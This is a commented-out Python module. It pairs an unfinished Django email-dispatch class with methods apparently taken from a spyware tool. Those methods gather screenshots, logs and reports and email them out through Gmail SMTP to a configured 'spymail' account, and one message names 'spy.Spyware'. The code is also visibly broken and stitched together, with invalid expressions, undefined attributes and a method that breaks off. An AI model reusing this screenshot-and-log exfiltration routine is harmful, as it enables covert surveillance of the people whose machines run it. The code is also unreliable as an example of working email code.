# import email
# import smtplib
# import ssl
# from email import encoders
# from email.mime.base import MIMEBase
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# from string import Template
# from typing import Iterable, Mapping, Tuple, Union
# import typing
# import requests
# from .. import (
#     os,
#     strfdate, strftime,
# )
# from django.conf import settings
# from dataclasses import dataclass
# from io import TextIOBase, TextIOWrapper
# from django.shortcuts import render



# def pos(integer: int) -> str:
#     raw = str(integer)
#     if integer > 3 and integer < 21:
#         return raw + "th"
#     elif raw.endswith("1"):
#         return raw + "st"
#     elif raw.endswith("2"):
#         return raw + "nd"
#     elif raw.endswith("3"):
#         return raw + "rd"
#     else:
#         return raw + "th"

# @dataclass
# class Monkey:
#     receivers: Union[Iterable[str], str]
#     sender: str = settings.MONKEY['email']

#     __doc__ = '''
#     ## PARAMS
#     * receivers: an iterable of email addresses or a single email address
#     * sender: specify the default "from" email address
    
    
#     '''

#     def dispatch(
#         self,
#         request,
#         template_name: str,
#         context: dict = {},
#         attachments: Union[Iterable[Tuple[str, TextIOBase]], Mapping[TextIOBase]] = ...,
#         receivers: Union[Iterable[str], str] = ...):
#         if receivers is ...:
#             receivers = self.receivers
#         if attachments is ...:
#             attachments = []
#         if not isinstance(receivers, Iterable):
#             raise TypeError(
#                 'Monkey.dispatch: receivers expected an iterable not %s' % type(receivers)
#             )
#         if not isinstance(attachments, Iterable):
#             raise TypeError(
#                 'Monkey.dispatch: attachments expected an iterable not %s' % type(receivers)
#             )
#         if isinstance(attachments, Mapping):
#             parts = []
#             for name in attachments:
#                 if not isinstance(attachments[name], (TextIOBase, TextIOWrapper)):
#                     raise TypeError(
#                         'Monkey.dispatch: value in attachments should be a io buffer not %s' % type(attachments[name])
#                     )
#                 part = MIMEBase("application", "octet-stream")
#                 part.set_payload(attachments[name].read())
#                 part.add_header(
#                     "Content-Disposition",
#                     f"attachment; filename={str(name) | repr(name)}",
#                 )
#                 parts.append(part)
#         else:
#             parts = []
#             for attachment in attachments:
#                 if not isinstance(attachment[1], (TextIOBase, TextIOWrapper)):
#                     raise TypeError(
#                         'Monkey.dispatch: value in attachments should be a io buffer not %s' % type(attachment[0])
#                     )
#                 part = MIMEBase("application", "octet-stream")
#                 part.set_payload(attachment[1].read())
#                 part.add_header(
#                     "Content-Disposition",
#                     f"attachment; filename={str(attachment[0]) | repr(attachment[0])}",
#                 )
#                 parts.append(part)
#         content = render(request, template_name, context)
#         content = content.content.decode('utf8')

        
        

        


#     @property
#     def attachShots(self):
#         for shot in self.getScreenshots:
#             print("Attaching shot-%s..." % shot['name'])
#             with open(shot['path'], "rb") as attachment:
#                 part = MIMEBase("application", "octet-stream")
#                 part.set_payload(attachment.read())
#             part.add_header(
#                 "Content-Disposition",
#                 f"attachment; filename= {shot['name']}",
#             )
#             self.message.attach(part)
#             encoders.encode_base64(part)
#             self.this.report('## Attached.')

#     @property
#     def attachFiles(self):
#         this = self.this
#         this.echo_and_report("## Attaching files...")
#         for pipe in (this.logpipe, this.echopipe):
#             with open(pipe) as attachment:
#                 part = MIMEBase("application", "octet-stream")
#                 part.set_payload(attachment.read())
#                 part.add_header(
#                     "Content-Disposition",
#                     f"attachment; filename= {os.path.split(pipe)[1]}",
#                 )
#                 self.message.attach(part)
#                 encoders.encode_base64(part)

#         def addReport():
#             self.this.report("## Attaching report.")
#             with open(this.reportspipe) as attachment:
#                 part = MIMEBase("application", "octet-stream")
#                 part.set_payload(attachment.read())
#                 part.add_header(
#                     "Content-Disposition",
#                     f"attachment; filename= {os.path.split(this.reportspipe)[1]}",
#                 )
#                 self.message.attach(part)
#                 encoders.encode_base64(part)
#                 this.echo_and_report('## All files attached.')
#         return addReport

#     @property
#     def loadTemplate(self):
#         with open(self.this.emailTemplate) as temp:
#             tempStr = Template(temp.read())
#             res = tempStr.safe_substitute(
#                 log=''.join(list(self.getLog)),
#                 report=''.join(list(self.getReport)),
#                 info=''.join(list(self.getInfo))
#             )
#             self.message.attach(MIMEText(res, "html"))
#             return res

#     @property
#     def getScreenshots(self):
#         for shot in os.listdir(self.this.screenshotsDir):
#             yield {
#                 'path': os.path.join(
#                     self.this.screenshotsDir,
#                     shot
#                 ),
#                 'name': shot,
#             }

#     @property
#     def getLog(self):
#         with open(self.this.logpipe) as log:
#             for line in log.readlines():
#                 yield line

#     @property
#     def getReport(self):
#         with open(self.this.reportspipe) as report:
#             for line in report.readlines():
#                 yield line

#     @property
#     def getInfo(self):
#         with open(self.this.echopipe) as info:
#             for line in info.readlines():
#                 yield line

#     def send(self):
#         this = self.this
#         if not this.spymail or not this.password:
#             this.echo_and_report((
#                 "Configure your email and password in the config.json file"
#                 " and call spy.Spyware.loadConfig() on the file"
#             ))
#             return
#         if not self.network_is_ok:
#             return False
#         this.echo_and_report('## Loading template.')
#         self.loadTemplate
#         addReport = self.attachFiles
#         self.attachShots
#         context = ssl.create_default_context()
#         with smtplib.SMTP_SSL(
#             "smtp.gmail.com",
#             465,
#             context=context
#         ) as server:
#             this.echo_and_report('Logging in.')
#             server.login(this.spymail, this.password)
#             this.echo_and_report("Sending.")
#             addReport()
#             text = self.message.as_string()
#             server.sendmail(
#                 this.spymail,
#                 this.emailAddress,
#                 text
#             )
#         return True
